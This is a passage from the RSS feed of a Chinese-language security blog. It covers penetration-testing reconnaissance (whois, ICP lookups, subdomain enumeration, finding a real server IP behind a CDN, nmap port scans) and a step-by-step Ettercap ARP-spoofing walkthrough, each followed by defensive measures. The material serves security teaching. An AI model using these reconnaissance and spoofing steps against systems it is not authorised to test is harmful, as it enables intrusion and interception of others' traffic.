当我们访问&lt;code>www.baidu.com&lt;/code>这个域名时，我们的电脑会向&lt;code>DNS&lt;/code>查询百度的&lt;code>IP地址&lt;/code>。然后我们再通过百度的IP地址进行访问百度。因此我们在输入网址时，实质上也是通过IP地址访问的服务器，只是从&lt;code>域名到IP地址的转换&lt;/code>阶段对我们屏蔽了。&lt;/p>
&lt;h1 id="二收集域名信息">二、收集域名信息
&lt;/h1>&lt;p>当我们需要对一个网站进行渗透测试时，我们需要用到大量的信息。因此收集这些网站的信息是一件极其重要的事。&lt;/p>
&lt;h3 id="1-利用whois查询">1. 利用whois查询
&lt;/h3>&lt;p>whois是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。不同域名后缀的whois信息需要到不同的whois数据库查询。
例如如.com的whois数据库和.edu的whois数据库就不相同。
&lt;strong>查询接口：&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>&lt;a class="link" href="https://whois.aliyun.com" target="_blank" rel="noopener"
>https://whois.aliyun.com&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://www.whois365.com/cn" target="_blank" rel="noopener"
>https://www.whois365.com/cn&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="http://whois.chinaz.com" target="_blank" rel="noopener"
>http://whois.chinaz.com&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://whois.aizhan.com" target="_blank" rel="noopener"
>https://whois.aizhan.com&lt;/a>&lt;/li>
&lt;li>在Kali中，可以在终端输入&lt;code>whois 目标网址&lt;/code>进行查询&lt;/li>
&lt;/ol>
&lt;h3 id="2-icp备案查询">2. ICP备案查询
&lt;/h3>&lt;p>ICP（Internet Content Provider）即为网络内容服务商，即向广大用户综合提供互联网信息业务和增值业务的电信运营商。其必须具备的证书即为ICP证。ICP证是指各地通信管理部门核发的《中华人民共和国电信与信息服务业务经营许可证》。
根据《互联网信息服务管理办法》指出互联网信息服务分为经营性和非经营性两类。国家对经营 性互联网信息服务实行许可制度；对非经营性互联网信息服务实行备案制度。未取得许可或 者未履行备案手续的，不得从事互联网信息服务。
对于国内网站，我们可以通过查询ICP来得到相应的信息。
&lt;strong>查询接口：&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>&lt;a class="link" href="http://www.beian.miit.gov.cn/publish/query/indexFirst.action" target="_blank" rel="noopener"
>工业和信息化部ICP/IP地址/域名信息备案管理系统&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="http://icp.chinaz.com/" target="_blank" rel="noopener"
>站长之家&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="http://icp.alexa.cn/" target="_blank" rel="noopener"
>http://icp.alexa.cn/&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="http://www.beianbeian.com/" target="_blank" rel="noopener"
>http://www.beianbeian.com/&lt;/a>&lt;/li>
&lt;/ol>
&lt;h1 id="三收集子域名">三、收集子域名
&lt;/h1>&lt;p>对于一个网站的管理员来说，他在自己的顶级域名设下的防护相对于其子域名来说要强的多。
因此我们在对网站进行渗透测试时，往往是从其子域名入手。因此收集其子域名也是信息收集的一项重要工作。&lt;/p>
&lt;h3 id="子域名挖掘工具">子域名挖掘工具：
&lt;/h3>&lt;ol>
&lt;li>&lt;strong>Maltego CE&lt;/strong>（该工具需要登注册登陆才能使用，有条件的可以使用）&lt;img src="https://raw.githubusercontent.com/wlynxg/pic/main/2025/06/01/20250601-230026.png"
loading="lazy"
alt="image.png"
>&lt;/li>
&lt;li>&lt;strong>搜索引擎挖掘：&lt;/strong>
在互联网如此发达的今天，你在网络上泄漏的任何信息都可以在搜索引擎挖掘到，用好搜索引擎也是一项重要技能。
搜索子网语法：&lt;strong>site:目标网站&lt;/strong>&lt;/li>
&lt;li>&lt;strong>wydomain挖掘：&lt;/strong>
&lt;strong>wydomain&lt;/strong>是猪猪侠开发的一款基于Python语言开发的子域名信息搜集工具，因其枚举速度快，结果准确，成为不少白帽居家旅行的必备神器。工具主要分为两个模块，dnsburte模块和wydomain模块，dnsburte模块通过用户自定义字典发送dns查询，最后筛选出符合条件的域名。而wydomain模块则是通过调用多个第三方网站的公开api获取子域名数据。
在Kali上可以直接终端上执行&lt;code>git clone https://github.com/ring04h/wydomain.git&lt;/code>克隆到本地。
&lt;strong>GitHub地址&lt;/strong>：&lt;a class="link" href="https://github.com/ring04h/wydomain" target="_blank" rel="noopener"
>https://github.com/ring04h/wydomain&lt;/a>&lt;/li>
&lt;li>&lt;strong>第三方网站挖掘：&lt;/strong>
a. &lt;a class="link" href="http://tool.chinaz.com/subdomain" target="_blank" rel="noopener"
>http://tool.chinaz.com/subdomain&lt;/a>
b. &lt;a class="link" href="https://dnsdumpster.com" target="_blank" rel="noopener"
>https://dnsdumpster.com&lt;/a>
c. &lt;a class="link" href="https://phpinfo.me/domain/" target="_blank" rel="noopener"
>https://phpinfo.me/domain/&lt;/a>&lt;/li>
&lt;/ol>
&lt;h1 id="四ip地址收集">四、IP地址收集
&lt;/h1>&lt;p>在讲收集域名IP地址前，我们先来了解一个东西——CDN。&lt;/p>
&lt;h3 id="1-cdn简介">1. CDN简介
&lt;/h3>&lt;p>CDN（Content Delivery Network）即内容分发网络，主要解决因传输距离和不同运营商节点造成的网络速度性能低下的问题。
简单来说，就是一组在不同运营商之间的对接点上的高速缓存服务器，把用户经常访问的静态数据资源直接缓存到节点服务器上，当用户再次请求时，会直接分发到离用户近的节点服务器上响应给用户，当用户有实际数据交互时才会从远程Web服务器上响应，这样可以大大提高网站的响应速度及用户体验。
带有CDN的网站访问方式和普通网站是不一样的：
&lt;strong>普通网站：用户访问域名&amp;ndash;&amp;gt;解析服务器IP&amp;ndash;&amp;gt;访问目标主机&lt;/strong>
&lt;strong>带有CDN的网站：用户访问域名&amp;ndash;&amp;gt;CDN节点&amp;ndash;&amp;gt;真实服务器IP&amp;ndash;&amp;gt;访问目标主机&lt;/strong>
我们可以发现，当我们访问带有CDN的网站时，解析到的IP并非真实服务器IP，而是CDN的IP。
在渗透测试中，为了要知道网站服务器的真实IP，我们必须绕过CDN查找出网站的真实ip地址。&lt;/p>
&lt;h3 id="1-判断网站是否有cdn">1. 判断网站是否有CDN
&lt;/h3>&lt;p>由于CDN是分布在不同地区的，因此当从不同地区ping网站时会得到不同的CDN地址。因此我们可以通过从多个地区ping网站的方式判断网站是否有CDN。
&lt;strong>可以ping测试的网站：&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>&lt;a class="link" href="https://wepcc.com/" target="_blank" rel="noopener"
>https://wepcc.com/&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="http://ping.chinaz.com/" target="_blank" rel="noopener"
>http://ping.chinaz.com/&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="http://ping.aizhan.com/" target="_blank" rel="noopener"
>http://ping.aizhan.com/&lt;/a>&lt;/li>
&lt;/ul>
&lt;h3 id="2-绕过cdn">2. 绕过CDN
&lt;/h3>&lt;p>当我们确定一个网站确实具有CDN服务后，我们就需要想办法绕过CDN去获得真实服务器IP。&lt;/p>
&lt;ol>
&lt;li>&lt;strong>查询子域名&lt;/strong>：由于CDN需要在不同地区部署服务器，因此CDN的价格必定不会便宜。正所谓“好钢要用到刀刃上”，大多数站长都只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。&lt;/li>
&lt;li>&lt;strong>查询主域名&lt;/strong>：很多网站为了在维护网站时更方便，不用等cdn缓存，就只让&lt;strong>www域名使用CDN&lt;/strong>，而秃域名使用CDN。因此我们可以尝试把网站的www去掉，只使用秃域名。&lt;/li>
&lt;li>&lt;strong>邮件服务器&lt;/strong>：一般的邮件系统都在内部，没有经过CDN的解析，通过目标网站用户注册或者RSS订阅功能，查看邮件，寻找邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名，就可以获得目标的真实IP(必须是目标自己的邮件服务器，第三方或者公共邮件服务器是没有用的)。&lt;/li>
&lt;li>&lt;strong>查看域名历史解析记录&lt;/strong>：也许目标很久之前没有使用CDN，所以可能会存在使用 CDN 前的记录。所以可以通过网站&lt;a class="link" href="https://www.netcraft.com" target="_blank" rel="noopener"
>https://www.netcraft.com&lt;/a>来观察域名的IP历史记录。&lt;/li>
&lt;li>&lt;strong>国外访问&lt;/strong>：国内的CDN往往只对国内用户的访问加速，而国外的CDN就不一定了。因此，通过国外在线代理网站&lt;a class="link" href="https://asm.ca.com/en/ping.php" target="_blank" rel="noopener"
>https://asm.ca.com/en/ping.php&lt;/a>访问 ，可能会得到真实的IP。&lt;/li>
&lt;li>&lt;strong>Nslookup查询&lt;/strong>：查询域名的NS记录、MX记录、TXT记录等很有可能指向的是真实ip或同C段服务器。&lt;/li>
&lt;li>&lt;strong>网站漏洞&lt;/strong>：利用网站自身存在的漏洞，很多情况下会泄露服务器的真实IP地址&lt;/li>
&lt;li>&lt;strong>Censys查询SSL证书找到真实IP&lt;/strong>：利用“Censys网络空间搜索引擎”搜索网站的SSL证书及HASH，在https://crt.sh上查找目标网站SSL证书的HASH，然后再用Censys搜索该HASH即可得到真实IP地址。&lt;/li>
&lt;/ol>
&lt;h1 id="五开发端口收集">五、开发端口收集
&lt;/h1>&lt;p>当我们获得目标网站真实服务器IP后，就需要查询服务器上开发端口，根据不同端口进行不同的测试方案。&lt;/p>
&lt;h3 id="1-开发端口收集">1. 开发端口收集
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>使用nmap进行探测：&lt;/strong>
在Kali上执行下列语句即可开启nmap服务进行端口探测。&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">nmap -A -v -T4 目标
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>&lt;strong>使用在线网站探测：&lt;/strong>
&lt;a class="link" href="http://tool.chinaz.com/port/" target="_blank" rel="noopener"
>http://tool.chinaz.com/port/&lt;/a>&lt;/li>
&lt;/ul>
&lt;h3 id="2-端口攻击">2. 端口攻击
&lt;/h3>&lt;p>&lt;img src="https://raw.githubusercontent.com/wlynxg/pic/main/2025/06/01/20250601-231841.png"
loading="lazy"
alt="image.png"
>&lt;/p>
&lt;p>更多端口信息和攻击方式参考：&lt;a class="link" href="https://blog.csdn.net/u012725164/article/details/50988455" target="_blank" rel="noopener"
>传送门&lt;/a>&lt;/p>
&lt;h3 id="3-防御措施">3. 防御措施
&lt;/h3>&lt;ul>
&lt;li>修改默认远程端口3389/22&lt;/li>
&lt;li>修改默认FTP端口21&lt;/li>
&lt;li>修改默认Mysql/Mssql端口3306/1433&lt;/li>
&lt;li>关闭易入侵端口：88、137、138、139、389、445、464、593、636、1025、3001-3003、3095-3097等&lt;/li>
&lt;li>关闭影子账号端口：4899&lt;/li>
&lt;li>关闭易提权端口：123&lt;/li>
&lt;li>关闭imail激活的两个IP，限制连接所有端口156.21.1.171、156.21.1.22&lt;/li>
&lt;li>使用安全策略进行协同防护&lt;/li>
&lt;li>配置并开启防火墙&lt;/li>
&lt;li>配置服务器安全狗软件&lt;/li>
&lt;li>如不使用UDP端口，封闭所有UDP。&lt;/li>
&lt;/ul></description></item><item><title>嗅探欺骗——ARP欺骗</title><link>https://wlynxg.github.io/blog/p/%E5%97%85%E6%8E%A2%E6%AC%BA%E9%AA%97arp%E6%AC%BA%E9%AA%97/</link><pubDate>Fri, 22 Aug 2025 17:34:52 +0800</pubDate><guid>https://wlynxg.github.io/blog/p/%E5%97%85%E6%8E%A2%E6%AC%BA%E9%AA%97arp%E6%AC%BA%E9%AA%97/</guid><description>&lt;h1 id="嗅探欺骗arp欺骗">嗅探欺骗——ARP欺骗
&lt;/h1>&lt;h1 id="一介绍">一、介绍
&lt;/h1>&lt;p>ARP欺骗（ARP spoofing），又称ARP毒化或ARP攻击。它是针对以太网地址解析协议（ARP）的一种攻击技术。&lt;/p>
&lt;h3 id="1-攻击原理">1. 攻击原理
&lt;/h3>&lt;p>通过欺骗局域网内访问者的网关MAC地址，使访问者错以为攻击者更改后的MAC地址是网关的MAC，导致应当发往网关地数据包发送到攻击者。&lt;/p>
&lt;h3 id="2-造成危害">2. 造成危害
&lt;/h3>&lt;p>ARP欺骗会导致被攻击者的数据包无法发送到网关，造成被攻击者无法正常上网（从网关发往被攻击者的数据包不受影响）。
由于被攻击者的数据包都发往了攻击者，因此还会泄漏重要个人信息。&lt;/p>
&lt;h1 id="二kali上实现arp欺骗">二、Kali上实现ARP欺骗
&lt;/h1>&lt;h3 id="1-工具介绍">1. 工具介绍
&lt;/h3>&lt;p>我们实现ARP攻击需要用到的软件为&lt;strong>Ettercap&lt;/strong>。
Ettercap是针对中级攻击者的综合套件。它具有嗅探实时连接，动态过滤内容和许多其他有趣技巧的功能。它支持许多协议的主动和被动解剖，并包括许多用于网络和主机分析的功能。
&lt;img src="https://raw.githubusercontent.com/wlynxg/pic/main/2025/06/01/20250601-230602.png"
loading="lazy"
alt="image.png"
>&lt;/p>
&lt;h3 id="2-实现攻击">2. 实现攻击
&lt;/h3>&lt;ol>
&lt;li>在终端输入&lt;code>ettercap -G&lt;/code>启动Ettercap界面版&lt;/li>
&lt;li>选择&lt;strong>eth0&lt;/strong>网卡（若为无线攻击则选择wlan0）
&lt;img src="https://raw.githubusercontent.com/wlynxg/pic/main/2025/06/01/20250601-170711.png"
loading="lazy"
alt="image.png"
>&lt;/li>
&lt;li>扫描主机
&lt;img src="https://raw.githubusercontent.com/wlynxg/pic/main/2025/06/01/20250601-170723.png"
loading="lazy"
alt="image.png"
>&lt;/li>
&lt;li>在&lt;strong>Host List&lt;/strong>中选择被攻击主机IP
&lt;img src="https://raw.githubusercontent.com/wlynxg/pic/main/2025/06/01/20250601-170738.png"
loading="lazy"
alt="image.png"
>&lt;/li>
&lt;li>攻击方式选择ARP欺骗
&lt;img src="https://raw.githubusercontent.com/wlynxg/pic/main/2025/06/01/20250601-170900.png"
loading="lazy"
alt="image.png"
>&lt;/li>
&lt;li>攻击完成
&lt;img src="https://raw.githubusercontent.com/wlynxg/pic/main/2025/06/01/20250601-170850.png"
loading="lazy"
alt="image.png"
>&lt;/li>
&lt;/ol>
&lt;h1 id="三防范arp欺骗">三、防范ARP欺骗
&lt;/h1>&lt;ul>
&lt;li>升级客户端的操作系统和应用程序补丁&lt;/li>
&lt;li>设置静态的ARP缓存表&lt;/li>
&lt;li>升级杀毒软件及其病毒库&lt;/li>
&lt;li>交换机上绑定端口和MAC地址&lt;/li>
&lt;li>生活中不要在连接公用WIFI时输入账号密码&lt;/li>
&lt;/ul></description></item></channel></rss>